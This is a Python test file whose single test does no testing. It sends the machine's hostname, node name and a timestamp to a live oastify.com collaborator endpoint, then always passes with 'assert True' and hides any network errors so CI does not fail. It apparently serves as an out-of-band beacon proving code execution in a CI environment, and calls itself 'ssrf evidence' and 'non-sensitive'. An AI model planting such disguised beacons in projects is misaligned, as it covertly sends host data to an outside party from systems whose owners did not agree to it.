"""
Simple evidence test: POST minimal non-sensitive info to collaborator.
Sends only:
  - timestamp (epoch seconds)
  - local hostname (socket.gethostname())
  - node name (platform.node())

DO NOT ADD any metadata token or secret to this payload.
The collaborator will observe the source IP from the HTTP connection.
"""

import time
import json
import socket
import platform
import requests

# collaborator endpoint (replace with your actual collaborator URL if different)
COLLAB_ENDPOINT = "https://2ehp86ohtz0xx0o9x5b60yizrqxhld92.oastify.com/report"

def test_send_evidence_minimal():
    payload = {
        "timestamp": int(time.time()),
        "hostname": socket.gethostname(),
        "node": platform.node(),
        "note": "external-ssrf-evidence-minimal"
    }
    try:
        # send the minimal, non-sensitive JSON to collaborator
        r = requests.post(COLLAB_ENDPOINT, json=payload, timeout=5)
        print(f"[evidence] posted to collaborator, status={r.status_code}")
    except Exception as e:
        # network/reporting errors are printed but test still passes (so CI doesn't fail unexpectedly)
        print(f"[evidence] failed to post to collaborator: {e!r}")
    assert True
